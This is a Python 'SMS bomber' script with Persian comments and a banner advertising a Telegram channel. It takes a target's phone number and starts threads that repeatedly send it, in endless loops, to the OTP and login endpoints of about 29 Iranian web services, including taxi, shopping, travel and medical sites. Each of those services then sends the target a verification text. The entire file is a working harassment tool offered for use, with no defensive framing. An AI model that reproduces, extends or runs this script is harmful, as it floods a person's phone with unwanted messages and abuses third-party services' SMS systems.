import requests
import os
import threading
import time

red='\033[31m'
green='\033[32m'

# تعریف URL‌ها
urls = [
    "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
    "https://api.divar.ir/v5/auth/authenticate",
    "https://nobat.ir/api/public/patient/login/phone",
    "https://api.alopeyk.com/api/v2/login?platform=pwa",
    "https://api.alopeyk.com/api/v2/register-customer?platform=pwa",
    "https://shahrfarsh.com/Account/Login",
    "https://www.digistyle.com/users/login-register/",
    "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
    "https://api.digikalajet.ir/user/login-register/",
    "https://digitalsignup.snapp.ir/ds3/api/v3/otp",
    "https://api.ostadkr.com/login",
    "https://www.miare.ir/api/otp/driver/request/",
    "https://api.tapsi.ir/api/v2.2/user",
    "https://mobapi.banimode.com/api/v2/auth/request",
    "https://drdr.ir/api/v3/auth/login/mobile/init",
    "https://gw.taaghche.com/v4/site/auth/login",
    "https://gw.taaghche.com/v4/site/auth/signup",
    "https://api.komodaa.com/api/v2.6/loginRC/request",
    "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
    "https://uiapi2.saapa.ir/api/otp/sendCode",
    "https://api.vandar.io/account/v1/check/mobile",
    "https://api.mobit.ir/api/web/v8/register/register",
    "https://taraazws.jabama.com/api/v4/account/send-code",
    "https://api.pinorest.com/frontend/auth/login/mobile",
    "https://service.tetherland.com/api/v5/login-register",
    "https://ws.alibaba.ir/api/v3/account/mobile/otp",
    "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
    "https://student.classino.com/otp/v1/api/logi",
    "https://takshopaccessorise.ir/api/v1/sessions/login_request"
]

# تعیین تنظیمات پیکربندی
phone_number = input("Enter phone Number (9++++++) : ")
num_threads = 5  # تعداد نخ‌ها
interval = 1  # زمان انتظار بین هر ارسال (ثانیه)

# تابع برای ارسال درخواست به URL
def send_request(url):
    while True:
        try:
            response = requests.post(url, data={"cellphone": "+98" + phone_number})
            print(f"Sent to {url}, status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending to {url}: {e}")

# پاک کردن صفحه کنسول
os.system("clear")
# چاپ عنوان با رنگ قرمز
print(f"{red} ")
os.system("figlet sms bomber")
print(f"{green}===========================================")
print("  telegram channel: @VPN_Alexabot            ")
print(f"{green}===========================================")

# ایجاد و شروع نخ‌ها
threads = []
for i in range(num_threads):
    for url in urls:
        t = threading.Thread(target=send_request, args=(url,))
        t.start()
        threads.append(t)
    time.sleep(interval)  # انتظار برای فراخوانی بعدی

# انتظار برای پایان همه نخ‌ها
for t in threads:
    t.join()

# اتمام برنامه
print("Done!")
